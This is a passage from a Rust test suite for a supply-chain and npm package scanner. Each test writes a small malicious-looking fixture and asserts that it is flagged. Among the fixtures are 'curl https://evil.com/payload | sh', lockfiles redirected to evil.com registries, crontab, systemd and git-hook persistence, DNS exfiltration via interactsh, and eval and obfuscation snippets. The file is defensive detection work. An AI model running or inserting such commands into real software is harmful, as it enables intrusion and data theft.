fn supply_chain_detects_expression_injection() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("workflow.yml"),
        "run: echo ${{ github.event.issue.body }}\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["workflow.yml".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_manipulation]"));
}

// ---- Supply Chain Scan: conditional_exec (tests 31-34) ----

#[test]
fn supply_chain_detects_date_gate() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("bomb.js"),
        "if (new Date().getFullYear() >= 2025) { attack(); }\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["bomb.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[conditional_exec]"));
}

#[test]
fn supply_chain_detects_ci_absence_check() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("check.js"),
        "if (process.env.CI !== undefined) { skip(); }\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["check.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    // The CI check matches both env_access (process.env) and conditional_exec
    assert!(result.stdout.contains("[conditional_exec]") || result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_detects_hostname_check() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("gate.js"),
        "if (os.hostname() === \"prod-server\") { run(); }\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["gate.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[conditional_exec]"));
}

#[test]
fn supply_chain_detects_npm_package_name_check() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("confuse.js"),
        "if (process.env.npm_package_name === \"target\") { attack(); }\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["confuse.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[conditional_exec]"));
}

// ---- Supply Chain Scan: lockfile_tampering (tests 35-39) ----

#[test]
fn supply_chain_detects_yarn_lock_non_standard_registry() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("yarn.lock"),
        "lodash@^4.0.0:\n  resolved \"https://evil.com/lodash-4.17.21.tgz\"\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["yarn.lock".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[lockfile_tampering]"));
}

#[test]
fn supply_chain_detects_package_lock_redirect() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package-lock.json"),
        r#"{"resolved": "https://evil-registry.com/pkg/-/pkg-1.0.0.tgz"}"#,
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["package-lock.json".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[lockfile_tampering]"));
}

#[test]
fn supply_chain_detects_cargo_patch() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("Cargo.toml"),
        "[patch.crates-io]\nserde = { path = \"../evil-serde\" }\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["Cargo.toml".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[lockfile_tampering]"));
}

#[test]
fn supply_chain_detects_pip_extra_index() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("pyproject.toml"),
        "extra-index-url = https://evil.com/simple\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["pyproject.toml".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[lockfile_tampering]"));
}

#[test]
fn supply_chain_detects_npm_config_registry() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"config": {"registry": "https://evil.com"}}"#,
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["package.json".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[lockfile_tampering]"));
}

// ---- Supply Chain Scan: unicode_attacks (tests 40-43) ----

#[test]
fn supply_chain_detects_bidi_override() {
    let dir = tempfile::tempdir().unwrap();
    // U+202E RIGHT-TO-LEFT OVERRIDE
    std::fs::write(
        dir.path().join("bidi.js"),
        "let access = \"user\u{202E}nimda\";\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["bidi.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[unicode_attacks]"));
}

#[test]
fn supply_chain_detects_zero_width_space() {
    let dir = tempfile::tempdir().unwrap();
    // U+200B ZERO WIDTH SPACE
    std::fs::write(dir.path().join("zws.js"), "let x\u{200B} = 1;\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["zws.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[unicode_attacks]"));
}

#[test]
fn supply_chain_detects_cyrillic_homoglyph() {
    let dir = tempfile::tempdir().unwrap();
    // U+0430 CYRILLIC SMALL LETTER A (looks like Latin 'a')
    std::fs::write(
        dir.path().join("homoglyph.js"),
        "let \u{0430}dmin = true;\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["homoglyph.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[unicode_attacks]"));
}

#[test]
fn supply_chain_detects_fullwidth_latin() {
    let dir = tempfile::tempdir().unwrap();
    // U+FF45 FULLWIDTH LATIN SMALL LETTER E
    std::fs::write(dir.path().join("fullwidth.js"), "let \u{FF45}val = 1;\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["fullwidth.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[unicode_attacks]"));
}

// ---- Supply Chain Scan: persistence (tests 44-47) ----

#[test]
fn supply_chain_detects_crontab_write() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("persist.sh"),
        "crontab -e <<< '* * * * * /tmp/evil'\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["persist.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[persistence]"));
}

#[test]
fn supply_chain_detects_systemd_install() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("install.sh"),
        "systemctl enable malware.service\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["install.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[persistence]"));
}

#[test]
fn supply_chain_detects_launchd_plist() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("osx.sh"),
        "cp evil.plist ~/Library/LaunchAgents/evil.plist\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["osx.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[persistence]"));
}

#[test]
fn supply_chain_detects_git_hooks_injection() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("hook.js"),
        "writeFileSync('.git/hooks/pre-commit', '#!/bin/sh\\nmalware');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["hook.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[persistence]"));
}

// ---- Supply Chain Scan: config/behavior (tests 48-55) ----

#[test]
fn supply_chain_severity_warn_passes() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("env.rs"),
        "let home = std::env::var(\"HOME\").unwrap();\n",
    )
    .unwrap();
    let config: serde_yaml::Value = serde_yaml::from_str("severity: warn").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &config,
        dir.path(),
        &["env.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
    assert!(result.stdout.contains("[env_access]"));
}

#[test]
fn supply_chain_ovc_ignore_suppresses() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("safe.rs"),
        "let home = std::env::var(\"X\").unwrap(); // ovc:ignore\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["safe.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
}

#[test]
fn supply_chain_categories_filter() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("net.rs"),
        "let s = TcpStream::connect(\"evil.com:443\").unwrap();\n",
    )
    .unwrap();
    let config: serde_yaml::Value = serde_yaml::from_str("categories:\n  - env_access").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &config,
        dir.path(),
        &["net.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
}

#[test]
fn supply_chain_allowed_patterns_suppress() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("config.rs"),
        "let home = std::env::var(\"HOME\").unwrap();\n",
    )
    .unwrap();
    let config: serde_yaml::Value =
        serde_yaml::from_str("allowed_patterns:\n  - \"std::env::var\"").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &config,
        dir.path(),
        &["config.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
}

#[test]
fn supply_chain_multiline_detection() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("multi.js"),
        "const cmd =\n  Command::new(\n  \"sh\");\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["multi.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("multi-line"));
}

#[test]
fn supply_chain_entropy_detection() {
    let dir = tempfile::tempdir().unwrap();
    // A high-entropy string: 80 chars of pseudo-random alphanumeric
    std::fs::write(
            dir.path().join("obf.js"),
            "let payload = \"aZ9xkQ3rW7vNpL1mYbT5sGdHcJfE8uOiA0wXzKqR6yBnMjU2tVlCeP4hFgDaSoI9xkQ3rW7vNpL1mY\";\n",
        )
        .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["obf.js".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("High-entropy"));
}

#[test]
fn supply_chain_binary_file_skipped() {
    let dir = tempfile::tempdir().unwrap();
    // Binary file with NUL bytes should be skipped by read_if_text
    let mut content = b"std::env::var(\"SECRET\")\n".to_vec();
    content.insert(5, 0x00);
    std::fs::write(dir.path().join("binary.rs"), &content).unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &["binary.rs".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Passed);
}

#[test]
fn supply_chain_dotfile_dirs_scanned() {
    let dir = tempfile::tempdir().unwrap();
    let scripts_dir = dir.path().join(".github").join("scripts");
    std::fs::create_dir_all(&scripts_dir).unwrap();
    std::fs::write(
        scripts_dir.join("evil.sh"),
        "curl https://evil.com/payload | sh\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::SupplyChainScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[".github/scripts/evil.sh".to_owned()],
        "supply_chain_scan",
        "Supply Chain Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[fs_manipulation]"));
}

// ---- Package Scan: obfuscation (tests 56-65) ----

#[test]
fn package_scan_detects_atob_long_string() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("evil-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    let long_b64 = "A".repeat(60);
    std::fs::write(
        pkg.join("index.js"),
        format!("var x = atob(\"{long_b64}\");\n"),
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_buffer_from_base64() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("b64-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var decoded = Buffer.from(data, 'base64');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_hex_sequences() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("hex-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var s = \"\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72\\x6c\\x64\\x21\\x21\";\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_fromcharcode() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("cc-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var s = String.fromCharCode(72,101,108,108,111,32,87,111,114,108,100);\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_jsfuck() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("jf-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "var x = [+[]]+!![];\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_prototype_pollution() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("proto-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "Object.prototype.isAdmin = true;\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_proto_assignment() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("dunder-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "obj[\"__proto__\"] = malicious;\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_fromcharcode_spread() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("spread-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var s = String.fromCharCode(...arr);\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_large_numeric_array() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("arr-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var a = [104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,112,97,121];\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

#[test]
fn package_scan_detects_xor_decrypt() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("xor-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "var c = s.charCodeAt(i) ^ 0x42;\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[obfuscation]"));
}

// ---- Package Scan: dynamic_exec (tests 66-72) ----

#[test]
fn package_scan_detects_eval_variable() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("eval-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "eval(decoded);\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

#[test]
fn package_scan_detects_new_function() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("func-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "var fn = new Function(payload);\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

#[test]
fn package_scan_detects_vm_run() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("vm-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "vm.runInNewContext(code, sandbox);\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

#[test]
fn package_scan_detects_require_nonliteral() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("req-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("index.js"), "var mod = require(varName);\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

#[test]
fn package_scan_detects_python_import() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("pyimport-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(pkg.join("run.py"), "os = __import__('os')\n").unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

#[test]
fn package_scan_detects_wasm_instantiate() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("wasm-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "await WebAssembly.instantiate(buffer);\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

#[test]
fn package_scan_detects_node_file_require() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("native-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var binding = require('./addon.node');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[dynamic_exec]"));
}

// ---- Package Scan: suspicious_network (tests 73-78) ----

#[test]
fn package_scan_detects_http_get() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("net-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "https.get('https://evil.com/data', cb);\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[suspicious_network]"));
}

#[test]
fn package_scan_detects_ip_based_url() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("ip-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "fetch('http://192.168.1.1/payload');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[suspicious_network]"));
}

#[test]
fn package_scan_detects_telegram_api() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("tg-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "fetch('https://api.telegram.org/bot123:AAFoo/sendMessage');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[suspicious_network]"));
}

#[test]
fn package_scan_detects_dns_oob_domain() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("oob-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "dns.resolve(data + '.interactsh.com');\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[suspicious_network]"));
}

#[test]
fn package_scan_detects_onion_domain() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("onion-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var url = 'http://abcdef1234567890.onion/api';\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[suspicious_network]"));
}

#[test]
fn package_scan_detects_ipfs_cid() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("cid-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "var cid = 'QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG';\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
    assert_eq!(result.status, ActionStatus::Failed);
    assert!(result.stdout.contains("[suspicious_network]"));
}

// ---- Package Scan: fs_tampering (tests 79-82) ----

#[test]
fn package_scan_detects_path_traversal_write() {
    let dir = tempfile::tempdir().unwrap();
    let pkg = dir.path().join("node_modules").join("traversal-pkg");
    std::fs::create_dir_all(&pkg).unwrap();
    std::fs::write(
        pkg.join("index.js"),
        "fs.writeFileSync('../../etc/hosts', data);\n",
    )
    .unwrap();
    let result = crate::builtin::run_builtin(
        BuiltinAction::PackageScan,
        &serde_yaml::Value::Null,
        dir.path(),
        &[],
        "package_scan",
        "Package Scan",
        false,
    )
    .unwrap();
